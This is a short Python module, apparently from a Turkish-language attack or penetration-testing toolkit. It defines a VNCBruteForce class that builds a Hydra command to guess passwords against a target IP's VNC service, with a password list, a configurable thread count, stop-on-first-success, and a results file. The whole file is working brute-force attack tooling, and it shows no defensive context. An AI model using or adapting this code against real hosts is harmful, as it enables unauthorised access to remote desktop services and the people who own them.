from .base import BruteForceBase
from config import Ayarlar

class VNCBruteForce(BruteForceBase):
    def __init__(self, hedef_ip, hedef_port=5900):
        super().__init__(hedef_ip, hedef_port, "VNC")
    
    def _hydra_tipi(self):
        return "vnc"
    
    def _komut_olustur(self, kullanici_listesi, sifre_listesi):
        # VNC genellikle kullanıcı adı kullanmaz
        komut = [
            "hydra",
            "-P", sifre_listesi,
            self.hedef_ip,
            self._hydra_tipi(),
            "-s", str(self.hedef_port),
            "-t", str(Ayarlar.HYDRA_THREADS),
            "-f",
            "-o", f"sonuclar/{self.servis_adi.lower()}_sonuclari.txt"
        ]
        return komut